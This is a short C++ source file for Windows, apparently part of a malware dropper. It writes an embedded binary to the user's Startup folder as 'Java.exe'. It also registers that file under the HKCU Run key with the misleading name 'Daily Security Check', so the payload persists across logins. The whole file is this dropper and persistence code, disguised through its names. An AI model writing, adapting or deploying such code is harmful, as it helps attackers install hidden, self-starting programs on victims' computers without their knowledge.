//
// Created by 19535 on 2023-12-01.
//

#include "dropPayload.h"

void regModify(LPCWSTR data);

std::basic_string<wchar_t> dropPayload() {
    wchar_t userProfile[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile))) {
        std::wstring filePath = userProfile;
        filePath += L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Java.exe";
        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
                                   nullptr);

        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << GetLastError() << std::endl;
            return L"error";
        }

        DWORD bytesWritten;
        WriteFile(hFile, binaryData, binaryDataLength, &bytesWritten, nullptr);
        regModify(filePath.c_str());
        CloseHandle(hFile);
        return filePath;
    }
}

void regModify(LPCWSTR data) {
    HKEY hKey;
    LONG result;
    DWORD dwType = REG_SZ;

    result = RegOpenKeyEx(
            HKEY_CURRENT_USER,
            _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
            0,
            KEY_ALL_ACCESS,
            &hKey
    );
    if (result == ERROR_SUCCESS) {
        RegSetValueExW(
                hKey,
                L"Daily Security Check",
                0,
                dwType,
                (const BYTE*)data,
                (wcslen(data) + 1) * sizeof(wchar_t)
        );
        RegCloseKey(hKey);
    }
}